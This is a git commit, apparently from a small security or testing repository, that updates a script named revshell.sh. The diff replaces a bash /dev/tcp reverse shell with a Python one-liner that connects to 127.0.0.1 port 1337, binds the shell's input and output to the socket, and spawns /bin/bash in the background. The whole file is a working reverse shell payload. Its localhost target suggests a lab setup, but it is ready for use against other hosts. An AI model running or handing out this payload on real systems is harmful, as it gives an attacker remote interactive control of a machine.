86be99702f0daa35c7bef7a1a46f93490f7a805e
Cedric Brisson <cbrisson@coveo.com>
2023-07-19 11:09:48 -0400

    updated revshell to use python (more stable)

--- revshell.sh
+++ revshell.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1
+export RHOST="127.0.0.1";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' & disown
